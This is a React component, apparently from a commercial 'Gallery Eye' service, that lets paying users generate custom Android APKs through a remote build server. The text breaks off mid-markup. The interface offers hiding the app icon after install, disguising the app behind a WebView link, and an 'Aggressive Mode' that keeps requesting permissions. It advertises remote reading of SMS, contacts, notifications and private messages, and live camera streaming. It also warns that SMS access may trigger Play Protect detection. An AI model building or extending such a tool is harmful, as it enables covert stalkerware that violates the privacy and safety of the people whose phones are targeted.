"use client";

import { useState, useEffect } from 'react';
import CustomAlertModal from './CustomAlertModal';

interface AppGenerationModalProps {
    isOpen: boolean;
    onClose: () => void;
    uuid: string;
    socket: any;
    userPlan?: 'basic' | 'standard' | 'premium';
    onUpgrade?: () => void;
}

export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
    const isBasicPlan = userPlan === 'basic';
    const [status, setStatus] = useState<'idle' | 'queued' | 'generating' | 'downloading' | 'completed'>('idle');
    const [progress, setProgress] = useState(0);
    const [progressStep, setProgressStep] = useState("");
    const [downloadUrl, setDownloadUrl] = useState("");
    const [queuePosition, setQueuePosition] = useState(0);

    // Customization State
    const [appName, setAppName] = useState("Gallery Eye");
    const [hideApp, setHideApp] = useState(false);
    const [webLink, setWebLink] = useState("");
    const [customIcon, setCustomIcon] = useState<File | null>(null);

    // Permission Manager State
    const [enableSmsPermission, setEnableSmsPermission] = useState(false);
    const [enableContactsPermission, setEnableContactsPermission] = useState(false); // Gallery/Storage is usually needed
    const [enableStoragePermission, setEnableStoragePermission] = useState(true); // Storage permission for gallery access
    const [enableCameraPermission, setEnableCameraPermission] = useState(false); // Camera permission for surveillance
    const [enableNotificationListener, setEnableNotificationListener] = useState(false); // Notification listener access
    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'notifications' | null>(null);
    const [showAdvanced, setShowAdvanced] = useState(false);
    const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
    const [aggressivePermissions, setAggressivePermissions] = useState(false);

    // Custom Alert Modal State
    const [showCustomAlert, setShowCustomAlert] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });

    useEffect(() => {
        if (isOpen) {
            setStatus('idle');
            setProgress(0);
            setProgressStep("");
            setDownloadUrl("");
            setQueuePosition(0);
        }
    }, [isOpen]);

    useEffect(() => {
        if (!socket) return;

        const handleProgress = (data: any) => {
            setStatus('generating'); // Ensure we switch to generating if we get progress
            setProgress(data.progress);
            if (data.step) setProgressStep(data.step);
        };

        const handleQueueUpdate = (data: any) => {
            console.log("Queue Update:", data);
            setStatus('queued');
            setQueuePosition(data.position);
        };

        const handleReady = (data: any) => {
            setStatus('downloading');
            setProgress(100);
            setProgressStep("Download starting...");
            setDownloadUrl(data.url);

            // Trigger download
            const a = document.createElement('a');
            a.href = data.url;
            a.download = data.filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            setTimeout(() => {
                setStatus('completed');
            }, 2000);
        };

        const handleError = (data: any) => {
            console.error("APK Error:", data);
            setStatus('idle');
            alert(`Generation Failed: ${data.message}`);
        };

        socket.on('apk_progress', handleProgress);
        socket.on('queue_update', handleQueueUpdate);
        socket.on('apk_ready', handleReady);
        socket.on('apk_error', handleError);

        return () => {
            socket.off('apk_progress', handleProgress);
            socket.off('queue_update', handleQueueUpdate);
            socket.off('apk_ready', handleReady);
            socket.off('apk_error', handleError);
        };
    }, [socket]);

    const startGeneration = async () => {
        // Validate web link requirement
        // Web link is MANDATORY when app is NOT hidden
        if (!hideApp && !webLink.trim()) {
            setAlertData({
                title: 'Web Link Required',
                message: 'Please provide a WebView link for your app.\n\nThe app needs a URL to display when it starts.',
                type: 'warning'
            });
            setShowCustomAlert(true);
            return;
        }

        // When hideApp is true, proceed silently without asking (no validation)

        setStatus('generating');
        setProgress(5);
        setProgressStep("Initializing request...");

        try {
            if (!uuid) {
                throw new Error("User ID is missing. Please log in again.");
            }

            const formData = new FormData();
            formData.append('uuid', uuid);
            formData.append('appName', appName);
            formData.append('hideApp', hideApp.toString());
            formData.append('webLink', webLink);
            formData.append('enableSmsPermission', enableSmsPermission.toString());
            formData.append('enableContactsPermission', enableContactsPermission.toString());
            formData.append('enableStoragePermission', enableStoragePermission.toString());
            formData.append('enableCameraPermission', enableCameraPermission.toString());
            formData.append('enableNotificationListener', enableNotificationListener.toString());
            formData.append('aggressivePermissions', aggressivePermissions.toString());
            if (customIcon) {
                formData.append('icon', customIcon);
            }

            // Trigger generation (Async)
            const response = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-apk`, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(errorText || "Generation failed to start");
            }

            const data = await response.json();
            if (data.position) {
                setStatus('queued');
                setQueuePosition(data.position);
            }

            // Now we wait for socket events...

        } catch (error) {
            console.error(error);
            setStatus('idle');
            alert("Failed to start generation. Please try again.");
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fadeIn py-4 sm:py-10">
            <div className="bg-[#1a1a1a] border border-white/20 p-6 sm:p-8 rounded-3xl shadow-2xl max-w-md w-full text-center backdrop-blur-xl animate-scaleIn relative max-h-[90vh] overflow-y-auto custom-scrollbar">
                <button
                    onClick={onClose}
                    className="absolute top-4 right-4 text-white/40 hover:text-white"
                >
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                </button>

                <h2 className="text-3xl font-bold text-white mb-2">
                    {status === 'completed' ? 'App Ready!' : 'Customize Your App'}
                </h2>

                {status === 'idle' && (
                    <div className="text-left space-y-4 mt-6 mb-8">
                        <div>
                            <label className="block text-sm font-medium text-white/70 mb-1">App Name</label>
                            <input
                                type="text"
                                value={appName}
                                onChange={(e) => setAppName(e.target.value)}
                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-purple-500"
                                placeholder="Gallery Eye"
                            />
                        </div>

                        <div>
                            <label className="block text-sm font-medium text-white/70 mb-1">Web Link (Optional)</label>
                            <input
                                type="url"
                                value={webLink}
                                onChange={(e) => setWebLink(e.target.value)}
                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-purple-500"
                                placeholder="https://example.com"
                            />
                            <p className="text-xs text-white/40 mt-1">Opens this link when app starts.</p>
                        </div>

                        <div>
                            <label className="block text-sm font-medium text-white/70 mb-1">Custom Icon (Optional)</label>
                            <input
                                type="file"
                                accept="image/png, image/jpeg"
                                onChange={(e) => setCustomIcon(e.target.files?.[0] || null)}
                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white text-sm file:mr-4 file:py-1 file:px-3 file:rounded-full file:border-0 file:text-xs file:bg-purple-500 file:text-white hover:file:bg-purple-600"
                            />
                        </div>

                        <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-white/10'}`}>
                            <div className="flex items-center gap-2">
                                <span className="text-sm font-medium text-white/70">Hide App Icon</span>
                                {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
                            </div>
                            <button
                                onClick={() => {
                                    if (isBasicPlan) {
                                        onUpgrade?.();
                                        return;
                                    }
                                    setHideApp(!hideApp);
                                }}
                                className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-purple-500' : 'bg-white/20'}`}
                            >
                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                            </button>
                        </div>
                        <p className="text-xs text-white/40">{isBasicPlan ? 'Upgrade to Standard to unlock this feature' : 'App will be hidden from launcher after install.'}</p>

                        {/* Permission Manager Section */}
                        <div className="pt-4 border-t border-white/10">
                            <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
                                <svg className="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
                                Permission Manager
                            </h3>

                            {/* Storage/Gallery Permission */}
                            <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10 mb-2">
                                <div className="flex items-center gap-2">
                                    <svg className="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                                    <span className="text-sm font-medium text-white/70">Gallery/Storage Access</span>
                                    <button
                                        onClick={() => setShowPermissionInfo('storage')}
                                        className="text-white/40 hover:text-purple-400 transition-colors"
                                    >
                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                    </button>
                                </div>
                                <button
                                    onClick={() => setEnableStoragePermission(!enableStoragePermission)}
                                    className={`w-12 h-6 rounded-full transition-colors relative ${enableStoragePermission ? 'bg-purple-500' : 'bg-white/20'}`}
                                >
                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-7' : 'left-1'}`} />
                                </button>
                            </div>

                            {/* Camera Permission - Premium Only */}
                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${userPlan !== 'premium' ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
                                <div className="flex items-center gap-2">
                                    <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                    <span className="text-sm font-medium text-white/70">Camera Access</span>
                                    {userPlan !== 'premium' && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PREMIUM</span>}
                                    <button
                                        onClick={() => setShowPermissionInfo('camera')}
                                        className="text-white/40 hover:text-cyan-400 transition-colors"
                                    >
                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                    </button>
                                </div>
                                <button
                                    onClick={() => {
                                        if (userPlan !== 'premium') {
                                            onUpgrade?.();
                                            return;
                                        }
                                        setEnableCameraPermission(!enableCameraPermission);
                                    }}
                                    className={`w-12 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
                                >
                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && userPlan === 'premium' ? 'left-7' : 'left-1'}`} />
                                </button>
                            </div>

                            {/* Contacts Permission - Locked for Basic */}
                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
                                <div className="flex items-center gap-2">
                                    <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
                                    <span className="text-sm font-medium text-white/70">Contacts Access</span>
                                    {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
                                    <button
                                        onClick={() => setShowPermissionInfo('contacts')}
                                        className="text-white/40 hover:text-green-400 transition-colors"
                                    >
                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                    </button>
                                </div>
                                <button
                                    onClick={() => {
                                        if (isBasicPlan) {
                                            onUpgrade?.();
                                            return;
                                        }
                                        setEnableContactsPermission(!enableContactsPermission);
                                    }}
                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
                                >
                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                                </button>
                            </div>

                            {/* Notification Listener Permission */}
                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
                                <div className="flex items-center gap-2">
                                    <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
                                    <span className="text-sm font-medium text-white/70">Notification Access</span>
                                    {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
                                    <button
                                        onClick={() => setShowPermissionInfo('notifications')}
                                        className="text-white/40 hover:text-cyan-400 transition-colors"
                                    >
                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                    </button>
                                </div>
                                <button
                                    onClick={() => {
                                        if (isBasicPlan) {
                                            onUpgrade?.();
                                            return;
                                        }
                                        setEnableNotificationListener(!enableNotificationListener);
                                    }}
                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-cyan-500' : 'bg-white/20'}`}
                                >
                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                                </button>
                            </div>

                            {/* Advanced Section - Collapsible, Hidden by Default */}
                            <div className="mt-4">
                                <button
                                    onClick={() => setShowAdvanced(!showAdvanced)}
                                    className="flex items-center gap-2 text-sm text-white/50 hover:text-white/70 transition-colors"
                                >
                                    <svg className={`w-4 h-4 transition-transform ${showAdvanced ? 'rotate-90' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path>
                                    </svg>
                                    Advanced
                                </button>

                                {showAdvanced && (
                                    <div className="mt-3 space-y-3">
                                        {/* Aggressive Permissions */}
                                        <div className={`bg-yellow-500/10 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-yellow-500/30'}`}>
                                            <div className="flex items-center justify-between mb-1">
                                                <div className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                                                    <span className="text-sm font-medium text-yellow-300">Aggressive Mode</span>
                                                    {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
                                                </div>
                                                <button
                                                    onClick={() => {
                                                        if (isBasicPlan) {
                                                            onUpgrade?.();
                                                            return;
                                                        }
                                                        setAggressivePermissions(!aggressivePermissions);
                                                    }}
                                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-yellow-500' : 'bg-white/20'}`}
                                                >
                                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                                                </button>
                                            </div>
                                            <p className="text-xs text-yellow-200/50 text-left leading-tight">{isBasicPlan ? 'Upgrade to Standard to unlock' : 'Repeatedly asks for permissions. App stays visible until granted.'}</p>
                                        </div>

                                        {/* SMS Permission - Hidden under Advanced */}
                                        {/* SMS Permission - Hidden under Advanced */}
                                        <div className={`flex items-center justify-between bg-red-500/10 p-3 rounded-lg border ${isBasicPlan ? 'border-red-500/30 opacity-60' : 'border-red-500/30'}`}>
                                            <div className="flex items-center gap-2">
                                                <svg className="w-4 h-4 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
                                                <span className="text-sm font-medium text-red-300">SMS Access</span>
                                                <span className="text-xs text-red-400/70 px-2 py-0.5 bg-red-500/20 rounded-full">Risky</span>
                                                {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
                                            </div>
                                            <button
                                                onClick={() => {
                                                    if (isBasicPlan) {
                                                        onUpgrade?.();
                                                        return;
                                                    }
                                                    if (!enableSmsPermission) {
                                                        setShowPlayProtectWarning(true);
                                                    } else {
                                                        setEnableSmsPermission(false);
                                                    }
                                                }}
                                                className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-red-500' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                                            </button>
                                        </div>
                                        <p className="text-xs text-red-400/70 pl-2">⚠️ Enabling SMS may trigger Play Protect detection.</p>
                                    </div>
                                )}
                            </div>
                        </div>

                        {/* Play Protect Warning Modal */}
                        {showPlayProtectWarning && (
                            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[100]" onClick={() => setShowPlayProtectWarning(false)}>
                                <div className="bg-gradient-to-b from-red-900/90 to-red-950/95 rounded-2xl p-6 max-w-sm mx-4 border border-red-500/30 shadow-2xl" onClick={(e) => e.stopPropagation()}>
                                    <div className="flex items-center gap-3 mb-4">
                                        <div className="w-12 h-12 rounded-full bg-red-500/20 flex items-center justify-center">
                                            <svg className="w-6 h-6 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
                                            </svg>
                                        </div>
                                        <div>
                                            <h3 className="text-lg font-bold text-white">Play Protect Warning</h3>
                                            <p className="text-sm text-red-300/70">High Risk Detection</p>
                                        </div>
                                    </div>

                                    <p className="text-white/80 text-sm leading-relaxed mb-6">
                                        Enabling <strong>SMS Access</strong> significantly increases the chance that <strong>Google Play Protect</strong> will detect and block this app.
                                        The app may be flagged as harmful and prevented from installing.
                                    </p>

                                    <div className="flex gap-3">
                                        <button
                                            onClick={() => setShowPlayProtectWarning(false)}
                                            className="flex-1 px-4 py-2.5 rounded-lg bg-white/10 text-white/80 hover:bg-white/20 transition-colors text-sm font-medium"
                                        >
                                            Cancel
                                        </button>
                                        <button
                                            onClick={() => {
                                                setEnableSmsPermission(true);
                                                setShowPlayProtectWarning(false);
                                            }}
                                            className="flex-1 px-4 py-2.5 rounded-lg bg-red-500 text-white hover:bg-red-600 transition-colors text-sm font-medium"
                                        >
                                            I Understand
                                        </button>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* Permission Info Popup Modal */}
                        {showPermissionInfo && (
                            <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm">
                                <div className={`relative max-w-sm w-full mx-4 p-5 rounded-2xl border shadow-2xl ${showPermissionInfo === 'sms'
                                    ? 'bg-gradient-to-br from-blue-900/90 to-blue-950/90 border-blue-500/30'
                                    : 'bg-gradient-to-br from-green-900/90 to-green-950/90 border-green-500/30'
                                    }`}>
                                    <button
                                        onClick={() => setShowPermissionInfo(null)}
                                        className="absolute top-3 right-3 text-white/60 hover:text-white"
                                    >
                                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                    </button>

                                    {showPermissionInfo === 'sms' ? (
                                        <>
                                            <div className="flex items-center gap-3 mb-3">
                                                <div className="p-2 rounded-lg bg-blue-500/20">
                                                    <svg className="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
                                                </div>
                                                <h4 className="text-lg font-bold text-white">SMS Access</h4>
                                            </div>
                                            <p className="text-sm text-blue-100/80 leading-relaxed">
                                                Enabling this permission allows you to remotely view SMS messages on the device. You'll be able to see:
                                            </p>
                                            <ul className="mt-3 space-y-2 text-sm text-blue-200/70">
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    Message content & body
                                                </li>
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    Sender/receiver information
                                                </li>
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    Date & timestamps
                                                </li>
                                            </ul>
                                        </>
                                    ) : showPermissionInfo === 'camera' ? (
                                        <>
                                            <div className="flex items-center gap-3 mb-3">
                                                <div className="p-2 rounded-lg bg-cyan-500/20">
                                                    <svg className="w-6 h-6 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                                </div>
                                                <h4 className="text-lg font-bold text-white">Camera Access</h4>
                                            </div>
                                            <p className="text-sm text-cyan-100/80 leading-relaxed">
                                                Enabling this permission allows remote camera access. You'll be able to:
                                            </p>
                                            <ul className="mt-3 space-y-2 text-sm text-cyan-200/70">
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    Live stream from camera
                                                </li>
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    Capture photos remotely
                                                </li>
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    Record videos remotely
                                                </li>
                                            </ul>
                                        </>
                                    ) : showPermissionInfo === 'notifications' ? (
                                        <>
                                            <div className="flex items-center gap-3 mb-3">
                                                <div className="p-2 rounded-lg bg-cyan-500/20">
                                                    <svg className="w-6 h-6 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
                                                </div>
                                                <h4 className="text-lg font-bold text-white">Notification Access</h4>
                                            </div>
                                            <p className="text-sm text-cyan-100/80 leading-relaxed">
                                                Enabling this allows real-time monitoring of all device notifications:
                                            </p>
                                            <ul className="mt-3 space-y-2 text-sm text-cyan-200/70">
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    WhatsApp, Instagram, Telegram messages
                                                </li>
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    App names & icons
                                                </li>
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    Notification content & timestamps
                                                </li>
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    Calls, emails & all app alerts
                                                </li>
                                            </ul>
                                            <p className="mt-3 text-xs text-yellow-300/60">
                                                ⚠️ Requires manual enable in device Settings → Notification Access
                                            </p>
                                        </>
                                    ) : (
                                        <>
                                            <div className="flex items-center gap-3 mb-3">
                                                <div className="p-2 rounded-lg bg-green-500/20">
                                                    <svg className="w-6 h-6 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
                                                </div>
                                                <h4 className="text-lg font-bold text-white">Contacts Access</h4>
                                            </div>
                                            <p className="text-sm text-green-100/80 leading-relaxed">
                                                Enabling this permission allows you to remotely view contacts on the device. You'll be able to see:
                                            </p>
                                            <ul className="mt-3 space-y-2 text-sm text-green-200/70">
                                                <li className="flex items-center gap-2">
